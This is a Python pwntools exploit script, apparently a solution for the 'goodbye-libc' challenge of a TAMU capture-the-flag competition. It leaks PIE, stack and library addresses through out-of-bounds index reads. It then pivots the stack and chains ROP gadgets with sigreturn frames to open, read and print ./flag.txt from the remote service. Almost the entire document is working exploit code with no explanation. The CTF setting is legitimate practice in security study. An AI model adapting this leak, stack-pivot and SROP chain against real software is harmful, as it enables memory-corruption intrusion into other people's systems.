from pwn import *
import re, time

HOST, PORT, SNI = "streams.tamuctf.com", 443, "goodbye-libc"
context.arch = "amd64"
context.timeout = 2

POP_RBP_LEAVE = 0x1500
READ, WRITE, EXIT = 0x1020, 0x1010, 0x1030
LEAK_LIB = 0x1710
PIE_OFF = 0x1CBD
LIB_READ_RET = 0x1065
LIB_SYSCALL = 0x1063
LIB_POP3 = 0x103F
LIB_POP_RDX = 0x1041

FLAG = re.compile(rb"gigem\{[^}\n]+\}")

def start():
    return remote(HOST, PORT, ssl=True, sni=SNI)

def menu(io, n):
    io.recvuntil(b"Enter input: ")
    io.sendline(str(n).encode())

def leak(io, idx):
    menu(io, 6)
    io.recvuntil(b"[1-3]: ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"Value written: ")
    return int(io.recvline())

def write(io, idx, val):
    menu(io, 1)
    io.recvuntil(b"[1-3]: ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"Select value to write: ")
    io.sendline(str(val).encode())

def leak_lib(io, pie):
    menu(io, 1)
    io.recvuntil(b"[1-3]: ")
    io.sendline(b"4294967295")
    io.recvuntil(b"Select value to write: ")
    io.sendline(str(pie + LEAK_LIB).encode())
    out = io.recvuntil(b"Enter input: ")
    return int(re.search(rb"Result of \d+ \+ (\d+):", out).group(1)) - LIB_READ_RET

def stage1(pie, lib, dst, n):
    return flat(
        0,
        lib + LIB_POP3, 0, dst, n,
        pie + READ,
        pie + POP_RBP_LEAVE, dst
    )

def stage2(pie, lib, base, path):
    scratch  = base + 0x400
    flagbuf  = base + 0x500
    close_sp = base + 0x140
    open_sp  = base + 0x280
    pathaddr = base + 0x340

    f = SigreturnFrame(kernel="amd64")
    f.rax = constants.SYS_close
    f.rdi = 3
    f.rip = lib + LIB_SYSCALL
    f.rsp = close_sp
    s = flat(0, lib + LIB_POP3, 0, scratch, 15, pie + READ, lib + LIB_SYSCALL, bytes(f))

    f = SigreturnFrame(kernel="amd64")
    f.rax = constants.SYS_open
    f.rdi = pathaddr
    f.rsi = 0
    f.rdx = 0
    f.rip = lib + LIB_SYSCALL
    f.rsp = open_sp
    s = s.ljust(close_sp - base, b"\0")
    s += flat(0, lib + LIB_POP3, 0, scratch, 15, pie + READ, lib + LIB_SYSCALL, bytes(f))

    s = s.ljust(open_sp - base, b"\0")
    s += flat(
        0,
        lib + LIB_POP3, 3, flagbuf, 0x80,
        pie + READ,
        lib + LIB_POP3, 1, flagbuf, 0x80,
        pie + WRITE,
        pie + EXIT
    )
    s = s.ljust(pathaddr - base, b"\0") + path + b"\0"
    return s

def main():
    io = start()

    pie   = leak(io, 0xffffffff) - PIE_OFF
    stack = leak(io, 0xfffffffe)
    lib   = leak_lib(io, pie)
    log.info(f"pie={pie:#x} stack={stack:#x} lib={lib:#x}")

    buf   = stack - 0xBC
    pivot = buf + 0x100
    s2    = stage2(pie, lib, pivot, b"./flag.txt")
    s1    = stage1(pie, lib, pivot, len(s2))

    write(io, 0, len(s1))
    write(io, 1, pie + READ)
    write(io, 2, pie + POP_RBP_LEAVE)
    write(io, 3, buf)

    menu(io, 1)
    io.recvuntil(b"[1-3]: ")
    io.sendline(b"4294967295")
    io.recvuntil(b"Select value to write: ")
    io.sendline(str(lib + LIB_POP_RDX).encode())

    time.sleep(0.3); io.send(s1)
    time.sleep(0.1); io.send(s2)
    time.sleep(0.1); io.send(b"A" * 15)
    time.sleep(0.1); io.send(b"A" * 15)

    out = io.recvrepeat(3)
    io.close()

    m = FLAG.search(out)
    print(m.group().decode() if m else out)

if __name__ == "__main__":
    main()